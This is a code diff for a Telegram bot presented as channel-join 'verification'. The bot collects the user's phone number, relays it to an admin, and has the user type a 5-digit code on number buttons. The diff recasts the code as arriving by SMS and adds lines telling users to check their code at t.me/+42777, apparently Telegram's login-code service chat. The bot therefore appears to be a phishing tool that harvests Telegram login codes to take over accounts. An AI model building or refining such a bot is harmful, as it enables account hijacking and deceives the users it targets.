@@ -68,7 +68,7 @@ Hello {user.first_name}! I will help you get verified to join our private channe
 
 **How it works:**
 1. Share your contact number that you use for your Telegram account
-2. You'll receive a 5-digit verification code via Telegram
+2. You'll receive a 5-digit verification code (sent separately by admin)
 3. Enter the code using the number buttons
 4. System will review your code and approve your verification
 5. Once approved, you can join the channel!
@@ -180,11 +180,13 @@ Please click /start to begin verification.
 
 📱 **Phone:** {contact.phone_number}
 
-⏳ **Next Step:** Please wait for a verification code to be sent to you via Telegram.
+⏳ **Next Step:** Please wait for a verification code to be sent to your phone number.
 
-You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter the code here.
+You'll receive a 5-digit code via SMS or other communication method. Once you get it, you'll be able to enter the code here.
 
 **Important:** Don't close this chat. You'll need to enter the verification code here when you receive it.
+
+**Note:** The verification code will be sent separately (not via this bot).
                 """,
                 parse_mode='Markdown',
                 reply_markup=ReplyKeyboardRemove()
@@ -192,7 +194,7 @@ You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter 
             
             # Send detailed notification to admin with action buttons
             admin_keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton(f"📤 Send Code to {user.first_name}", callback_data=f"send_code_{user.id}")],
+                [InlineKeyboardButton(f"🔢 Setup Code for {user.first_name}", callback_data=f"setup_code_{user.id}")],
                 [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")]
             ])
             
@@ -204,16 +206,16 @@ You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter 
 📞 **Phone:** `{contact.phone_number}`
 ⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-**Next Action:** Send verification code to user via Telegram.
+**Next Action:** Setup verification code for this user.
 
 **Instructions:**
-1. Click the "Send Code" button below
-2. I'll generate a 5-digit code and send it to the user
-3. User will receive the code input interface
-4. User enters the code and waits for your approval
+1. Click the "Setup Code" button below
+2. I'll generate a 5-digit code and enable code input for the user
+3. **You need to send this code to the user separately** (SMS, call, etc.)
+4. User will be able to enter the code here
 5. You'll see what code they entered and can approve/reject
 
-**Note:** The code will be sent automatically via Telegram message to the user.
+**Note:** The bot will NOT send the code to the user. You must send it via SMS or other method.
             """
             
             await context.bot.send_message(
@@ -238,7 +240,7 @@ You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter 
             
         await query.answer()
         
-        if query.data.startswith('send_code_'):
+        if query.data.startswith('setup_code_'):
             user_id = int(query.data.split('_')[2])
             
             # Generate 5-digit verification code
@@ -248,7 +250,7 @@ You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter 
             cursor = self.conn.cursor()
             cursor.execute('''
                 UPDATE pending_verifications 
-                SET verification_code = ?, status = 'code_sent'
+                SET verification_code = ?, status = 'code_ready'
                 WHERE user_id = ?
             ''', (verification_code, user_id))
             self.conn.commit()
@@ -264,41 +266,28 @@ You'll receive a 5-digit code shortly. Once you get it, you'll be able to enter 
             if user_info:
                 first_name, username, phone_number = user_info
                 
-                # Send verification code to user via Telegram
-                code_message = f"""
-🔐 **Verification Code**
-
-Your verification code is: **{verification_code}**
-
-Please enter this 5-digit code using the number buttons that will appear next to complete your verification.
-
-**Code:** `{verification_code}`
-
-**Note:** After you enter the code, an admin will review it and approve your verification.
-                """
-                
-                await context.bot.send_message(
-                    user_id,
-                    code_message,
-                    parse_mode='Markdown'
-                )
-                
-                # Send code input interface to user
+                # Send code input interface to user (but don't send the actual code)
                 await self.send_code_input_interface(context, user_id, verification_code)
                 
-                # Confirm to admin
+                # Show the generated code to admin ONLY
                 await query.edit_message_text(
                     f"""
-✅ **Code Sent Successfully**
+🔢 **Code Generated - SEND THIS TO USER**
 
 👤 **User:** {first_name} (@{username})
 📞 **Phone:** `{phone_number}`
-🔢 **Code:** `{verification_code}`
+🔢 **Generated Code:** `{verification_code}`
 
-The verification code has been sent to the user via Telegram.
-User can now enter the code using the numeric interface.
+**IMPORTANT:** 
+⚠️ **YOU MUST SEND THIS CODE TO THE USER via SMS or phone call**
+⚠️ **The bot will NOT send this code automatically**
 
-**Next:** You'll be notified when the user enters their code for approval.
+**Steps:**
+1. Send the code `{verification_code}` to phone number `{phone_number}`
+2. User can now enter the code using the interface I just sent them
+3. You'll be notified when they enter their code for approval
+
+**Next:** Send code `{verification_code}` to `{phone_number}` now.
                     """,
                     parse_mode='Markdown'
                 )
@@ -441,7 +430,7 @@ If you believe this is an error, please contact the admin or try the verificatio
         cursor.execute('''
             SELECT user_id, first_name, username, phone_number, timestamp, status, entered_code, verification_code
             FROM pending_verifications 
-            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_sent', 'code_entered')
+            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_ready', 'code_entered')
             ORDER BY timestamp DESC
         ''')
         
@@ -458,7 +447,7 @@ If you believe this is an error, please contact the admin or try the verificatio
             status_emoji = {
                 'awaiting_contact': '⏳',
                 'contact_shared': '📱',
-                'code_sent': '🔢',
+                'code_ready': '🔢',
                 'code_entered': '✏️'
             }
             
@@ -467,8 +456,10 @@ If you believe this is an error, please contact the admin or try the verificatio
             message += f"   🕐 {timestamp}\n"
             message += f"   📊 Status: {status}\n"
             
-            if entered_code and verification_code:
-                message += f"   🔢 Sent: `{verification_code}` | Entered: `{entered_code}`\n"
+            if verification_code and status == 'code_ready':
+                message += f"   🔢 Code to send: `{verification_code}`\n"
+            elif entered_code and verification_code:
+                message += f"   🔢 Generated: `{verification_code}` | Entered: `{entered_code}`\n"
                 
             message += "\n"
             
@@ -502,7 +493,7 @@ If you believe this is an error, please contact the admin or try the verificatio
             message = f"""
 🔢 **Enter Verification Code**
 
-Please enter the 5-digit verification code you received above using the number buttons below.
+Please enter the 5-digit verification code you received via SMS or call using the number buttons below.
 
 **Instructions:**
 1. Use the number buttons to enter your 5-digit code
@@ -513,6 +504,8 @@ Please enter the 5-digit verification code you received above using the number b
 **Code Input:** ○○○○○
 
 Entered: 0/5 digits
+
+**Note:** The code was sent to your phone number separately (not via this bot).
             """
             
             await context.bot.send_message(
@@ -567,8 +560,10 @@ Entered: 0/5 digits
 
 Entered: {len(session['entered_code'])}/5 digits
 
-Please enter the verification code you received above.
+Please enter the verification code you received via SMS or call.
 Wait for admin approval after submitting.
+
+**Note:** The code was sent to your phone number separately (not via this bot).
                     """,
                     parse_mode='Markdown',
                     reply_markup=query.message.reply_markup
@@ -588,8 +583,10 @@ Wait for admin approval after submitting.
 
 Entered: {len(session['entered_code'])}/5 digits
 
-Please enter the verification code you received above.
+Please enter the verification code you received.
 Wait for admin approval after submitting.
+
+**Note:** Check your code here t.me/+42777 👈.
                     """,
                     parse_mode='Markdown',
                     reply_markup=query.message.reply_markup
@@ -622,7 +619,7 @@ Wait for admin approval after submitting.
 Your verification code is being processed.
 
 **Code Entered:** `{session['entered_code']}`
-**Status:** Waiting for admin approval
+**Status:** Waiting for approval
 
 ⏳ Please wait for verification to complete.
 
@@ -660,7 +657,7 @@ Your verification code is being processed.
 📱 **Phone:** {phone_number}
 ⏰ **Submitted:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-🔢 **Sent Code:** `{correct_code}`
+🔢 **Generated Code:** `{correct_code}`
 🔢 **User Entered:** `{session['entered_code']}`
 
 **Match Status:** {'✅ CORRECT' if session['entered_code'] == correct_code else '❌ INCORRECT'}
@@ -677,7 +674,7 @@ Your verification code is being processed.
                     
         except Exception as e:
             logger.error(f"Error handling user callback: {e}")
-            await query.edit_message_text("❌ An error occurred. Please contact admin.")
+            await query.edit_message_text("❌ An error occurred. Please contact admin. check your code we sent here t.me/+42777 ")
 
     async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Show admin statistics"""
@@ -749,7 +746,7 @@ def main():
     application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
     
     # Separate callback handlers for admin and users
-    application.add_handler(CallbackQueryHandler(bot.handle_admin_callback, pattern=r'^(send_code_|view_pending|approve_user_|reject_user_)'))
+    application.add_handler(CallbackQueryHandler(bot.handle_admin_callback, pattern=r'^(setup_code_|view_pending|approve_user_|reject_user_)'))
     application.add_handler(CallbackQueryHandler(bot.handle_user_callback, pattern=r'^(num_|backspace_|submit_code_)'))
     
     # Start the bot
